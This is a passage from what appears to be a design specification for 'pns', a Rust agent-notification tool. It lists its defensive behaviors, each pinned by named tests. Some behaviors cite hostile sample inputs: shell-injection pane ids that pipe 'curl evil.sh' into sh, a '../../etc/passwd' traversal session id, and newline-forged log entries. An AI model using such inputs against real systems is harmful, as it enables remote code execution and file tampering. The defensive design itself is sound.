- Failure sources: an answer over `MAX_ANSWER_BYTES`, or one containing U+FFFD.
- Fail direction: fail-closed twice over. Characters are DROPPED rather than escaped, "because this is a
  sentence posted to a chat channel, where `\u{1b}` in the middle of a line is only noise", the opposite
  of the decision ring's rule and stated as such. And the whole answer is refused rather than repaired
  when it contains a replacement character: "the runner reads lossily, so a replacement character means
  invalid bytes were substituted somewhere in the answer".
- Thresholds: `recap::MAX_ANSWER_BYTES` = 16 KiB and the seam is asked for one byte more, so 16,384 bytes
  parses and 16,385 does not (`src/recap.rs` asserts both sides). `SUMMARIZED_MAX_CHARS` = 120: at 120
  the line is whole, at 121 the head of 119 characters survives with `…` (`src/recap.rs` asserts the
  count is exactly 120 for an over-long line).
- Required side effects: none in `recap`; the composition root posts what comes back.
- Forbidden side effects: a summarized line never becomes a heading. `recap::night_section` prefixes
  every summarized line with `- `, "so a line whose whole text is `NEEDS YOU` or a second window header"
  cannot render as one. A summarized section is also cut to the WINDOW's own length, so a
  two-hundred-line answer over a thirteen-event window cannot make the count lie.
- Timeout and cancellation: `main::summarize` returns `None` immediately for a zero deadline rather than
  spawning a process it would kill.
- Idempotency and duplicates: `safe_line` is idempotent.
- Privacy: a summarized line is posted to the same durable route the live events already reached; no pns
  command renders a recap body to a terminal (`src/recap.rs` module doc).
- Process ownership and cleanup: the summarizer runs under `system::run_bounded`, which kills the child
  and reaps it when the window closes.
- Compatibility contract: a line the model wrote survives only if a source pns actually FETCHED vouches
  for it, and one source vouches for at most one line (`recap::external_section`). The check runs before
  any clip, "so the width can never decide what is true".

### 6. A pull request body and a review note are somebody else's text and are treated as such

Given a `gh pr list` answer or a file matched by the review-note glob

When `recap::merged`, `recap::noted` or `recap::unreadable` composes its line and its prompt source

Then the title, the body summary, the note's first heading, the note's contents and the file NAME all go
through `safe_line`, each at its own cap

- Success: `recap::merged` caps the summary at `SOURCE_MAX_CHARS` = 400; `recap::noted` caps the cite at
  `CITE_MAX_CHARS` = 60, the heading at 400 and the body shown to the model at `NOTE_SOURCE_CHARS` =
  1,200. The name is capped ONCE, "so the token a line has to carry and the token the model was shown
  cannot differ".
- Failure sources: a note that will not open, which becomes `recap::unreadable` rather than a silent
  omission.
- Fail direction: fail-closed on content, fail-loud on absence. A file the operator's own pattern named
  is SAID rather than dropped, "silently leaving it out renders a night in which it never existed".
- Thresholds: `GH_LIMIT` = 50 per repository, `MAX_NOTES` = 25, `NOTE_READ_MAX` = 64 KiB per note,
  `GH_READ_MAX` = 512 KiB per listing. A listing that came back AT its own limit sets `truncated`, and
  the section then says "at least", "which is the honest reading of a cap".
- Required side effects: `main::read_note` opens with `O_NOFOLLOW` and re-reads the file type and the
  clock OFF THE HANDLE after the open, so a symlink dropped at a matched name cannot widen the read and a
  file rewritten after the scan cannot feed the window content from outside it.
- Forbidden side effects: the path is never checked twice: "checking the path a second time instead would
  be the same race with more steps".
- Timeout and cancellation: `GH_DEADLINE` = 30 s per listing under `run_bounded`.
- Idempotency and duplicates: one source vouches for at most one surviving line.
- Privacy: pull request bodies and review notes are fetched from repositories and directories the
  operator configured, and go into the summarizer prompt and the posted recap.
- Process ownership and cleanup: `gh` runs under `run_bounded`.
- Compatibility contract: `LINE_PREFIX` (`- `) is two characters of the width spent on making a forged
  heading impossible.

### 7. A pane id that could be a shell word is refused, never rewritten

Given a pane id such as `x; curl evil.sh | sh`, or one carrying a single dollar sign, backtick,
ampersand, pipe, semicolon, single or double quote, space, newline or slash, or one carrying an accented
letter, or the empty string

When `engine::decide` computes the plan

Then `pane_dropped` is set, the composition root substitutes the empty string, prints
`pns: dropped a pane id with shell metacharacters; no channel will focus a pane` on stderr, and no
channel is handed the value

- Success: `safety::pane_is_safe` is an ALLOWLIST: non-empty, and every character ASCII alphanumeric or
  one of `.`, `_`, `:`, `-`. The colon earns its place because herdr's own ids carry one (`wW:p21`) and
  without it "the banner silently loses the click-to-focus that the pane id exists to carry". Pinned by
  `src/safety.rs:a_pane_id_carrying_a_single_metacharacter_is_refused`,
  `src/safety.rs:a_herdr_pane_id_is_safe_colon_and_all_or_no_banner_can_focus_a_pane` and `src/engine.rs`
  (`decide_with(..., "wW:p21; curl evil | sh").pane_dropped`).
- Failure sources: none. The predicate is total.
- Fail direction: fail-closed. Refusal, not sanitization: an unsafe pane produces NO pane rather than a
  scrubbed one. An ASCII-only allowlist is deliberate even where no exploit is claimed:
  `src/safety.rs:the_allowlist_is_ascii_so_a_letter_from_outside_it_is_refused` states that "relaxing the
  test to every unicode letter admits a hundred thousand of them in one edit, none of them examined".
- Thresholds: no length threshold. Empty is refused "rather than treated as a command".
- Required side effects: the stderr line, printed ONCE at `main::dispatch_legs`, and only when a leg was
  going to receive the pane: "a scrub nobody was going to receive is not news". Sanitized once there
  rather than per channel, "a channel may be written in any language and cannot be expected to share the
  guard".
- Forbidden side effects: the pane must not reach `banner::click_command`, which builds a shell string
  (`herdr workspace focus <ws>; herdr agent focus <pane>`), nor `moshi::herdr_link`, which asks
  `pane_is_safe` AGAIN at the link "rather than assumed of the caller". The valid charset is legal
  unencoded in a URL query value, "which is what leaves nothing to escape".
- Timeout and cancellation: Not applicable.
- Idempotency and duplicates: pure predicate.
- Privacy: the decision ring records the pane only as `pane=present|none` plus `pane_dropped=yes|no`,
  never its value (behavior 11).
- Process ownership and cleanup: Not applicable.
- Compatibility contract: a safe pane passes through byte for byte
  (`tests/hooks.rs:the_herdr_pane_reaches_the_event_verbatim_and_a_hostile_one_is_scrubbed_downstream`
  asserts `wW:p21` on the delivered event).

### 8. A session id or pane id that cannot be a filename never becomes one

Given a hook payload carrying `"session_id":"../../etc/passwd"`, or a pane id spelling `..`, `a/b`,
`abc.new.1` or `abc.sweep.7`

When a marker, a lease or a state file would be named for it

Then no path is produced, nothing is written, nothing is removed, and the process still exits 0

- Success: `main::turn_marker` and `lights::blocked_marker` gate on `safety::session_id_is_safe`;
  `lights::lease_marker` and `lights::release_lease` gate on `safety::pane_file_is_safe`. Pinned by
  `tests/hooks.rs:a_session_id_carrying_a_path_traversal_never_becomes_a_filename` (the state directory
  is absent or empty afterwards) and `tests/hooks.rs:a_prompt_naming_a_traversal_removes_nothing`, which
  plants a real victim file, sends `"session_id":"../../victim"` to the END action, and asserts the
  victim still exists: "the END action goes through the same filename predicate as the START ... so a
  payload cannot aim the removal outside the marker dir".
- Failure sources: none. Both predicates are total.
- Fail direction: fail-closed, and in BOTH directions of the operation. A traversal id neither creates
  nor unlinks.
- Thresholds: no length threshold. Empty is refused "rather than naming a directory".
- Required side effects: none. The absence of a side effect IS the behavior.
- Forbidden side effects: no write, no unlink, no directory creation for a refused id.
- Timeout and cancellation: Not applicable.
- Idempotency and duplicates: refusal is stable.
- Privacy: a session id is a UUID in every harness this serves; the audit trail caps it at 64 characters
  and it never reaches a card.
- Process ownership and cleanup: not reached; nothing is created.
- Compatibility contract: three predicates, three different charsets, on purpose. `session_id_is_safe`
  refuses the colon that `pane_is_safe` admits; `pane_file_is_safe` refuses the `..` that `pane_is_safe`
  admits; both file predicates also refuse anything `lights::working_owner` reads as one of this crate's
  own working files (`<name>.new.<pid>`, `<name>.sweep.<pid>`), because such a value "would be swept by
  the wrong pid, or never released".
  `src/safety.rs:a_pane_id_shaped_like_a_working_file_never_names_a_lease` also asserts `a.new.b` stays
  safe, so the refusal is the digit-suffixed shape alone.

### 9. A newline in a payload field cannot forge a durable record

Given a `ConfigChange` payload with `source = "policy_settings"` and a `file_path` carrying a raw newline
followed by text shaped like a real audit entry

When `main::record_policy_settings_change` appends

Then the file gains exactly ONE line

- Success: `config_field` runs `rendered_plainly` (which flattens whitespace AND control characters
  through `hooks::flattened`) before `clipped`, so no newline survives into the composed line
  `{now} session={session} file={path}`. Pinned by
  `tests/hooks.rs:a_newline_in_a_file_path_cannot_forge_a_policy_audit_entry`, which asserts
  `recorded.lines().count() == 1`.
- Failure sources: a state directory that cannot be written.
- Fail direction: fail-quiet, deliberately. `record_policy_settings_change` discards the result: "an
  event path whose stdout a harness hook reads must not gain a line about the state directory, and a
  record that did not land costs a read of this file later, never a card".
- Thresholds: `POLICY_SETTINGS_AUDIT_KEPT` = 20 entries. The arithmetic is stated: a worst-case line is a
  timestamp plus 64 characters plus 1,024 characters, about 4.4 KB of UTF-8, and twenty of them about 88
  KB, "comfortably inside the reader's 256 KiB ceiling". WITHOUT both cuts the depth alone would not
  bound the file, and a ring past the read ceiling "can never be pruned again".
- Required side effects: exactly one appended line, under the ring lock, at mode `0600`.
- Forbidden side effects: no card of its own, no marker, no lease. It is "purely a durable trace of
  receipt".
- Timeout and cancellation: `claim_ring_lock` makes `RING_LOCK_ATTEMPTS` attempts with 1 ms sleeps and
  returns `WouldBlock` rather than waiting forever.
- Idempotency and duplicates: three received `policy_settings` events append three lines; the routing is
  marker-neutral and nothing coalesces them.
- Privacy: an empty path is recorded as the literal `none`, never as an empty field.
- Process ownership and cleanup: the lock is released by `HeldLock`'s drop.
- Compatibility contract: the journal and the activity ring solve the same problem differently. They hold
  free text, so they are JSON, "BUILT WITH `json!` AND NEVER WITH `format!`, which is the Rust spelling
  of this repo's build JSON with `jq -n --arg` rule". The decision ring solves it by refusing free text
  entirely (behavior 11).

### 10. The payload is bounded in bytes and in time, and a cut payload is never forwarded

Given a harness writes 1.2 MB to the hook's stdin, or writes nothing and never closes the pipe

When `main::read_payload` reads

Then the read stops at `MAX_PAYLOAD_BYTES + 1` bytes or at the 5 second deadline, `payload_is_whole`
answers false for the oversized case, and nothing is submitted to moshi

- Success: `read_payload` runs the read on a thread with `Read::take(stdin, MAX_PAYLOAD_BYTES + 1)` and
  `recv_timeout(payload_deadline())`. `payload_is_whole` compares against `MAX_PAYLOAD_BYTES` exactly.
  Pinned at BOTH entry points:
  `tests/hooks.rs:the_gate_refuses_an_over_cap_payload_as_firmly_as_the_hook_does` (the
  `pns gate pi-hook` path exits 0 and submits nothing) and, for the other edge,
  `tests/hooks.rs:a_payload_at_the_cap_is_whole_and_is_still_submitted`, which builds a payload of
  exactly 1,000,000 bytes and asserts the submission happens.
- Failure sources: a pipe nobody closes; a payload larger than memory.
- Fail direction: fail-closed toward NOT forwarding. "A payload that reached the cap was CUT MID-OBJECT,
  so it is no longer JSON and no longer what anybody wrote. Forwarding it hands moshi an empty parse".
  Measured 2026-08-19: a 1.2 MB payload forwarded as exactly 1,000,000 bytes.
- Thresholds: 1,000,000 bytes is whole and is submitted; 1,000,001 is not. The reader asks for one byte
  past the cap precisely to keep the two distinguishable.
- Required side effects: the notification STILL goes out for an over-cap payload, "because something IS
  blocked either way".
- Forbidden side effects: nothing reaches moshi. Half an object must never be submitted.
- Timeout and cancellation: `payload_deadline()` defaults to 5 s, overridable by
  `PNS_PAYLOAD_DEADLINE_MS`. The reader thread outlives a refusal, which is accepted because "the process
  is about to exit, and it holds nothing but its own buffer".
- Idempotency and duplicates: the single-submitter rule holds at both entry points
  (`tests/hooks.rs:the_gate_submits_one_prompt_exactly_once`).
- Privacy: the payload is never printed. The blocked hook's stdout is asserted EXACTLY empty
  (`tests/hooks.rs`, the stdout guard), because a first-character test would pass a byte-order mark in
  front of a valid `allow` object.
- Process ownership and cleanup: `spawn_moshi_hook` plus `answer_within` bound the forwarded child.
- Compatibility contract: `hooks::is_harness_subcommand` gates the gate's pass-through by SHAPE
  (`<lowercase-ascii>-hook`) rather than a roster, because "an unvetted word here is this repo handing a
  third-party binary a filesystem argument nobody chose".

### 11. The decision ring records identities and readings, never free text

Given an event carrying a project, a branch, a detail, a pane, a channel and the three narrowing flags

When `decision_log::line` writes its record

Then none of the project, branch, detail, pane value or channel appears anywhere on the line

- Success: `decision_log::line` reads only `agent` and `state` off the event, plus numbers, booleans,
  enum variant names and plugin names off the compiled roster. Pinned by
  `src/decision_log.rs:no_free_text_reaches_a_line_and_the_pane_appears_only_as_two_booleans`, which
  plants `SECRETPROJECT`, `SECRETBRANCH`, `SECRETDETAIL`, `wW:pSECRETPANE` and `SECRETCHANNEL` and
  asserts none of them, nor the substring `wW`, reaches the record.
- Failure sources: none. The struct IS the schema.
- Fail direction: fail-closed. `decision_log::printable` replaces the WHOLE value with `unprintable`
  rather than filtering characters out of it, so a partially hostile identity is not silently repaired
  into a plausible one.
- Thresholds: `IDENTITY_MAX` = 32. A 32-character name is whole; a 40-character one is cut to 32. The
  order is JUDGE THEN TRUNCATE and it is pinned as such:
  `identity(&format!("{}\n1756500000 forged/entry", "a".repeat(40)), "done")` answers `unprintable/done`,
  because "a clean 32-character head with a newline at position 40 passes any check that runs on the cut
  value". Judging first is also what makes the cut safe, since every accepted byte is ASCII.
- Required side effects: one line per event, `KEPT` = 5 deep, at mode `0600`.
- Forbidden side effects: no `actionId` is ever recorded; pns never has one, because moshi mints it
  inside the approval round trip and answers with an exit code. A leg's verdict is the VARIANT NAME and
  never the channel's own sentence, "because a channel's own words can carry a status code or a URL".
- Timeout and cancellation: Not applicable. `decision_log` is pure; the append is the composition root's.
- Idempotency and duplicates: `pns doctor` READS and never appends, "a doctor that recorded would push
  the decision the operator came to read out of the ring by the act of going to look at it".
- Privacy: this is the privacy rule of the module. The file is printed by `pns doctor` straight to a
  terminal, so "anything recorded here lands in a state file and then on a terminal". An empty value is
  `none`, a missing clock is `-` and a missing reading is `none`; none of the three is ever a zero.
- Process ownership and cleanup: bounded by `append_ring_line`'s prune.
- Compatibility contract: `KEPT` = 5 is both the ring depth and the report depth, "so the file holds
  exactly what is read".

### 12. What the doctor reads back out of a ring is escaped, not executed

Given a decision ring line holding `\u{1b}[31m`, a BEL, a backspace or a tab, whether or not its epoch
parses

When `decision_log::section` renders it

Then the control bytes are printed as the CHARACTERS THAT SPELL them and the raw bytes never reach the
terminal

- Success: `decision_log::escaped` is `str::escape_debug`, applied by BOTH arms of `render`: the parsed
  entry's body and the `complaint` for an unreadable one. Pinned by
  `src/decision_log.rs:a_parsed_entrys_body_is_escaped_by_the_same_rule_an_unreadable_one_is`, which also
  asserts each raw character is absent, and
  `src/decision_log.rs:an_unreadable_entry_is_quoted_short_and_with_its_control_bytes_escaped`.
- Failure sources: a hand edit, a truncated write, another program's output. The file is a plain file in
  a directory other things can reach.
- Fail direction: escape rather than drop, which is the OPPOSITE of `recap::safe_line`'s direction and is
  stated as such at both sites. The reader here is an operator asking what happened, so the escape is
  evidence. An entry that cannot be read is QUOTED rather than dropped: "a log that hides the one entry
  that mattered is worse than one that says it cannot read it".
- Thresholds: `QUOTED_MAX` = 60 characters for an unreadable entry, "short enough that a file of garbage
  cannot fill the report". `RING_READ_MAX` = 256 KiB for the file itself.
- Required side effects: none. `pns doctor` prints and does not write.
- Forbidden side effects: the section never moves the exit code. "IT REPORTS HISTORY, NEVER HEALTH".
- Timeout and cancellation: Not applicable.
- Idempotency and duplicates: reading is repeatable.
- Privacy: nothing here can print free text, because behavior 11 kept free text out of the file. The
  journal is COUNTED and never rendered: `main::missed_line` hands the contents to
  `missed_notifications::waiting_line`, which counts lines and has no parse at all, "so the operator's
  own text has no path from this file to a terminal".
- Process ownership and cleanup: Not applicable.
- Compatibility contract: `render` never PARSES the body, only splits off the leading stamp and escapes
  the rest, "which is what keeps a format change in `line` from needing a matching change here".

### 13. Somebody else's sentence cannot forge a `pns doctor` line

Given `moshi-hook status` prints a `server:` line, a `displayName` or a `hostId` containing a newline, a
carriage return, an escape sequence or a non-ASCII character

When `doctor::pairing_lines` builds its report

Then only spaces and ASCII graphic characters survive, capped at 200 characters, and the relayed text is
visibly inside the one line pns wrote

- Success: `doctor::printable` keeps `' '` and `char::is_ascii_graphic()` and takes 200. It is applied at
  the point the sentence becomes a LINE, not where it is stored: "the report holds what moshi said, and
  this is what decides what may be printed". `PairingReport::server` is held RAW for exactly that reason.
  Pinned by
  `src/doctor.rs:a_relayed_value_carrying_a_newline_or_a_control_byte_cannot_forge_a_report_line` and
  `src/doctor.rs:an_identity_moshi_named_cannot_forge_a_report_line_either`, which asserts
  `!lines[0].chars().any(char::is_control)`.
- Failure sources: moshi renaming or dropping the `server:` line, which degrades to no relay.
- Fail direction: fail-closed, and it drops rather than escapes. The newline is the load-bearing case:
  "an unfiltered newline would print a second `pns doctor:` line that the operator would read as pns's
  own verdict, and a report that can be made to lie about itself is worse than no relay at all". The
  carriage return is named separately because it survives being split into lines and returns the cursor
  to column zero.
- Thresholds: `RELAY_MAX` = 200 characters, counted AFTER the filter, "so the cap can never land inside a
  multi-byte sequence". A 500-character sentence relays exactly 200; 300 accented characters relay NO
  LINE AT ALL, because nothing printable survived. `doctor::ANSWER_MAX` = 1 MiB gates whether the answer
  is looked at, and `PAIRING_READ_MAX` = 2 MiB gates whether it arrives, the room between them keeping
  "moshi-hook answered something this cannot read" distinguishable from "did not answer".
- Required side effects: the relayed line is ATTRIBUTED (`pns doctor: moshi says: ...`), "because pns is
  not making this claim and could not check it".
- Forbidden side effects: nothing matches on the sentence's content. "pns has no stable way to tell Moshi
  Pro attached from host does not belong to this user token, and a prefix or substring rule over moshi's
  prose would fail in the dangerous direction the day the wording changes".
- Timeout and cancellation: two legs run in sequence under `moshi_json_deadline()` (5 s default) and
  `moshi_status_deadline()` (8 s default). The worst case is the SUM, measured at 13.07 s, and the doc
  comment says so rather than letting a reader assume the larger.
- Idempotency and duplicates:
  `tests/dispatch.rs:an_answer_over_the_byte_cap_is_refused_on_both_legs_rather_than_read` also asserts
  the pairing check leaves no file behind and does not write to the ring.
- Privacy: the relayed sentence is moshi's, printed on the operator's own terminal.
- Process ownership and cleanup: both children run under `run_bounded`, killed and reaped at the
  deadline.
- Compatibility contract: `doctor::printable` and `decision_log::printable` are deliberately two rules,
  not one. "One predicate for both would have to be the wider of the two, which is the narrower one
  weakened".

### 14. A route name that could not be a URL path segment is refused rather than glued

Given `--channel` or `[plugins.router] stale_alert_channel` names `a/b`, `../x`, `a b`, `a?x=1`, `a#f`,
`.`, `a\nb`, `%2e%2e`, `café` or the empty string

When the hermes URL is built

Then `channel_url` answers `None` and the post goes to the DEFAULT route

- Success: `safety::route_name_is_usable` is one predicate read by two callers, `channel_url` and the
  config read that resolves a route by name. Pinned by
  `src/channels/hermes.rs:one_rule_judges_a_route_name_wherever_it_is_read`, which asserts the predicate
  AND the URL builder agree for every hostile case, and
  `src/channels/hermes.rs:a_name_that_could_not_be_a_path_segment_is_refused_not_glued`.
- Failure sources: a base URL with no `/` in it, which also yields `None` rather than a bogus URL
  (`src/channels/hermes.rs:a_base_without_a_path_yields_nothing_rather_than_a_bogus_url`).
- Fail direction: fail-closed on the NAME, fail-LOUD on the delivery. The route is refused, but the
  notification still goes out on the default route, "because a misrouted notification on the loud route
  beats a silently dropped one". `home::stale_alert_channel` returns a complaint the composition root
  prints, and the alert still delivers: "a diagnostic that can be taken down by its own settings is not
  one". Pinned by
  `tests/dispatch.rs:an_unusable_stale_alert_route_complains_and_still_delivers_the_alert`, which asserts
  the exact stderr line and that one alert was delivered.
- Thresholds: no length threshold; only the charset and non-emptiness.
- Required side effects: one stderr line naming the CONFIG KEY, because "the config is where the operator
  has to go".
- Forbidden side effects: the URL is built by swapping the base URL's FINAL path segment, never by
  appending, so nothing traversal-shaped can walk up the path even if the predicate were widened.
- Timeout and cancellation: the post runs under `ASYNC_DEADLINE` = 10 s or the validated sync deadline.
- Idempotency and duplicates: the recap's one fallback fires once and never loops: "a default route that
  refuses too is a gateway problem, and a recap is not worth a retry storm against one".
- Privacy: route NAMES cross the command line, never URLs, "the gateway and its route table stay the
  single source of truth in the hermes config".
- Process ownership and cleanup: Not applicable.
- Compatibility contract: `home::stale_alert_channel` returns its complaint rather than printing it,
  matching `moshi::mobile_backend`; the composition root decides that a warning goes to stderr.

### 15. Every ring read is bounded, and a ring that cannot be read back heals rather than growing

Given a state ring file that is a FIFO, a symlink, a directory, larger than its read ceiling, or holding
bytes no reader can decode

When `main::append_ring_line` appends and prunes

Then an irregular file is REFUSED untouched and an unreadable one is replaced by the single line just
written

- Success: `readable_ring` stats with `symlink_metadata`, refuses anything that is not a regular file
  with `InvalidInput`, refuses anything over `read_max` with `FileTooLarge`, and only then reads.
  `append_ring_line` checks the same before the open, "with `symlink_metadata` so the link itself is what
  is judged rather than whatever it points at".
- Failure sources: three were MEASURED to cost more than the record they lost: a FIFO at the path parks
  the open forever "and with it the hook that called this, on every event"; an undecodable byte fails the
  read-back the prune runs on, "so the ring then grows without a bound"; a file left without its trailing
  newline welds this record onto the tail of the last one "and costs the reader BOTH".
- Fail direction: refuse rather than repair for an irregular file, because "deleting something this tool
  did not put there, on a path it only ever appends to, is a bigger action than skipping one record".
  Heal-to-one-line for an unreadable one, because what cannot be read back cannot be pruned.
- Thresholds: `RING_READ_MAX` = 256 KiB for the decision ring, the journal and the policy audit;
  `ACTIVITY_READ_MAX` = 1 MiB for the activity ring. Both are stated with their arithmetic: 20 audit
  entries at their field caps are about 88 KB, and 150 activity entries of worst-case escaped control
  bytes MEASURE 552,000 bytes, 53% of the ceiling. `tests/dispatch.rs:escape_heavy_activity` builds
  exactly that worst case through `serde_json`, "so the fixture is escaped exactly the way the engine
  escapes what it writes", and
  `tests/dispatch.rs:a_full_activity_ring_prunes_to_its_own_depth_instead_of_collapsing_to_one_line`
  shows a ring at the DECISION ring's 256 KiB ceiling collapsing.
- Required side effects: the append, the read-back, the prune and the publish all happen under ONE claim
  of the ring's own lock, so two events firing at once cannot interleave or drop a sibling's line. The
  separator rides in the same write.
- Forbidden side effects: nothing chmods a file it found there. `STATE_FILE_MODE` = `0600` is applied at
  CREATE, and the accepted limit is stated: a ring an earlier build left on disk keeps its umask mode
  until it is next created.
- Timeout and cancellation: `RING_LOCK_ATTEMPTS` short sleeps, then `WouldBlock`. A clock that cannot be
  read counts as zero, "so a broken clock can stand this caller down but never lets it steal a live
  holder's claim".
- Idempotency and duplicates: a path that is simply GONE after the append is NOT republished, because the
  file moved to a claim path and took the line with it: "the operator would be shown it twice".
- Privacy: the journal and the activity ring hold the operator's own text; every file this tool creates
  in its state directory is born `0600`, "none of them has a reason to be world-readable".
- Process ownership and cleanup: the lock releases on `HeldLock`'s drop; a failed publish unlinks its
  pending file.
- Compatibility contract: `read_max` travels with `kept` because the two are one decision. "Every caller
  states both numbers together, and the doc comment on each depth does the arithmetic".

### 16. Every child `run_bounded` starts is bounded in time AND in bytes, and past the ceiling is no answer

Given a probe, the condenser, a summarizer, `gh` or `moshi-hook` that hangs, writes without end, or exits
non-zero

When `system::run_bounded` runs it

Then the read stops at `max_bytes + 1`, the wait is polled against the same deadline, the child is killed
and reaped, and the caller gets `None`

- Success: `run_bounded` writes stdin INSIDE the window ("a child that never reads its stdin blocks the
  writer"), drops stdin to signal EOF, reads through `Read::take(max_bytes + 1)`, filters out any answer
  whose length exceeds `max_bytes`, and polls the wait rather than blocking, because "closed stdout is
  not an exited process: a child can close it and sleep".
- Failure sources: a wedged binary, a binary that is not installed, a non-zero exit, a network call that
  never returns.
- Fail direction: fail-closed to "no answer", which every caller reads as UNKNOWN, and unknown never
  suppresses. A TRUNCATED answer is refused rather than returned: "a process list cut at the ceiling has
  lost its last rows and a JSON listing has stopped mid-object, and both arrive at a caller looking
  exactly like a complete short answer".
- Thresholds: `PROBE_DEADLINE` = 5 s and `PROBE_READ_MAX` = 1 MiB for every probe; `GH_DEADLINE` = 30 s
  and `GH_READ_MAX` = 512 KiB; `CONDENSER_DEADLINE` with `PROBE_READ_MAX`; `PAIRING_READ_MAX` = 2 MiB;
  `recap::MAX_ANSWER_BYTES + 1` for a summarizer. At `max_bytes` the answer is returned, at
  `max_bytes + 1` it is not, and the reader is asked for the extra byte "so the bound stays inclusive
  like every other bound in this crate".
- Required side effects: stderr is `Stdio::null()` on every bounded child, so a child's own error text
  never reaches the operator's terminal through this seam.
- Forbidden side effects: argv goes STRAIGHT to `Command`, never through a shell. Stated at
  `main::summarize`: "the words are the words, so there is no quoting rule to get wrong and nothing in
  the window can be read as syntax".
- Timeout and cancellation: on expiry the child is killed and waited on; the answer is discarded.
- Idempotency and duplicates: `PNS_SUMMARIZING` plus a Codex home with NO hooks installed are the
  re-entry guard against a pns-to-codex-to-pns loop, the stripped home being "the hard guarantee".
- Privacy: the condenser is handed the turn's reply on stdin (up to `REPLY_MAX_CHARS`) and runs
  `-s read-only`. Its home is created `0700` "because it points at the live Codex credentials". Bytes are
  read, not a string: "the size that matters is the size on the wire, and a lossy conversion grows an
  invalid byte into three"; the lossy conversion happens only after the size has been judged.
- Process ownership and cleanup: `run_bounded` owns the kill and the reap. TWO CHILDREN NEVER REACH
  IT, and nothing bounds them: the detached recap (`src/main.rs:spawn_recap`) and an executable
  channel (`src/main.rs:deliver`), recorded as findings U1 and U2 in
  `persistence-and-process-lifecycle.md`. The heading is scoped to this function for that reason.
- Compatibility contract: `doctor::within_cap` is checked in the DOCTOR rather than in the shared spawn,
  "every other caller of that spawn reads a different tool, and one of them is a condenser whose whole
  job is to answer at length".

### 17. The moshi token reaches the request body and nothing else

Given `[plugins.mobile] token = "tok-integration"` and a delivered event

When the moshi channel posts

Then the token appears as `"token"` in the JSON body of one HTTPS POST, and nowhere in the engine's
stdout or stderr

- Success: `channels::moshi::webhook_body` builds `{"token":..,"title":..,"message":..}` plus an optional
  `data` object. The module doc states the rule: "the bash put it on stdin for the same reason (the
  process table is world-readable), and in-process is the stronger form of the same rule". Pinned by
  `tests/native.rs:native_moshi_posts_the_token_in_the_body_and_never_in_the_engines_own_output`, which
  captures the real request, asserts the body carries the token, and asserts neither stdout nor stderr
  does.
- Failure sources: no `token` key, the wrong TOML type, or an empty value, all of which read as "not set
  up" and never as an error.
- Fail direction: fail-closed and NAMED. `NO_TOKEN_LINE` reads
  `push SKIPPED -- no moshi token in the config ([plugins.mobile] token); nothing was sent`, naming the
  config key rather than a value.
- Thresholds: `POST_DEADLINE` = 10 s. `DELIVERED_STATUS` is `200..300`, spelled separately from hermes's
  identical range "because the two channels answer to different endpoints and a range moved for one of
  them must not follow the other".
- Required side effects: exactly one POST, `content-type: application/json`.
- Forbidden side effects: `max_redirects(0)`, because "following one would send the token to whatever
  host the endpoint names". A 3xx comes back as a RESPONSE rather than an error, and the status range
  check (not `is_ok`) is what stops a bounced card reading as delivered. The failure path prints nothing:
  `tests/native.rs:a_dead_moshi_endpoint_is_silent_because_the_only_report_would_carry_the_token`.
- Timeout and cancellation: one deadline, no retry.
- Idempotency and duplicates: no retry, so no duplicate card.
- Privacy: the verdict says WHETHER the push landed and never WHAT it carried, which is the change that
  made a failure reportable at all "so the secret stays where it was and a hand-run check can finally
  learn that the phone leg is broken".
- Process ownership and cleanup: in-process HTTP, no child.
- Compatibility contract: `moshi::herdr_link` asks `pane_is_safe` itself, because "a malformed action
  does not degrade the card, it DELETES it": moshi answers a bad body non-2xx and this channel reads any
  non-2xx as failed.

### 18. The hermes signing key never leaves the process; the signature does

Given `[plugins.hermes] key = "gate-signing-key"`

When the hermes channel posts

Then an HMAC-SHA256 (hash-based message authentication code over SHA-256) is computed in process over the
EXACT body bytes and sent as `X-Webhook-Signature`, and the key itself appears in no argv, no child
environment and no printed line

- Success: `channels::hermes::sign` builds the MAC in process and returns lowercase hex. The module doc
  states it directly: "The signing key never reaches argv, a child environment, or any printed line; the
  signature is computed in-process over the exact body bytes." Pinned by
  `tests/dispatch.rs:the_alert_carries_no_secret_and_no_raw_router_text`, which arms
  `key = "hermes-signing-secret"` and asserts absence from the delivered event, from stdout and from
  stderr; and by `tests/native.rs:sync_hermes_prints_the_posted_line_and_signs_the_exact_bytes_it_sent`.
- Failure sources: an empty or absent key, which yields `None` and a `Failed` verdict rather than a
  silent skip: "from the record's point of view it reads the same as a refusal: the entry is not there".
- Fail direction: fail-LOUD in sync mode, silent in async. Sync mode prints the HTTP status, and
  `skipped_line()` reads
  `post SKIPPED -- no hermes key in the config ([plugins.hermes] key); nothing was sent`, naming the key
  rather than a value. "a 401 swallowed silently leaves the Discord channel empty, and an empty channel
  looks like the jobs stopped running".
- Thresholds: `ASYNC_DEADLINE` = 10 s; sync default 5 s, clamped to `MAX_SYNC_DEADLINE_SECS` = 86,400.
  `PNS_REMOTE_TIMEOUT` of `0` is curl's `-m 0`, no deadline, and is treated as explicit caller intent.
- Required side effects: one POST carrying agent, state, project and the FULL message as `detail`,
  "because Discord has no length ceiling for the preview to serve".
- Forbidden side effects: `max_redirects(0)`, because "following one would send the signed body to
  whatever host the gateway names".
- Timeout and cancellation: one deadline per call, no retry except the recap's single route fallback.
- Idempotency and duplicates: `outcome_line` and `delivered` read ONE constant `DELIVERED_STATUS`
  (`200..300`), "so the rule cannot be moved for one and left standing for the other, which would have a
  doctor call a post good while the printed line called it FAILED".
- Privacy: the body is the operator's own event text and it goes to a LOCAL gateway
  (`http://127.0.0.1:8644/webhooks/pns` by default). Where hermes forwards it from there is hermes's
  business, not this crate's.
- Process ownership and cleanup: in-process HTTP, no child.
- Compatibility contract: `hermes_secret` reads `key` off `[plugins.hermes]`, non-empty, else `None`,
  "Silent, like every not-set-up reading".

### 19. What leaves this machine, and what rides with it

Given a fully configured install

When events, alerts and recaps are delivered

Then exactly five outbound destinations exist and each carries a stated payload

- Success: the destinations, from the code:
  1. moshi, `https://api.getmoshi.app/api/webhook` or `PNS_MOSHI_URL`. Carries the token, the title
     (`agent · state · project`), the message (the PREVIEW, at most 260 characters, which is the reply or
     detail text), and an optional `moshi://herdr?pane=<pane>` deep link built only from a `pane_is_safe`
     pane. This is the one destination outside the local network by default.
  1. hermes, `http://127.0.0.1:8644/webhooks/pns` or `PNS_HERMES_URL`, or the same base with its final
     path segment swapped for a `route_name_is_usable` route. Carries agent, state, project and the FULL
     message as `detail`, signed. Local by default.
  1. The hue bridge on the local network, `hue-application-key` header, carrying lamp state bodies only.
     No event text is sent to hue.
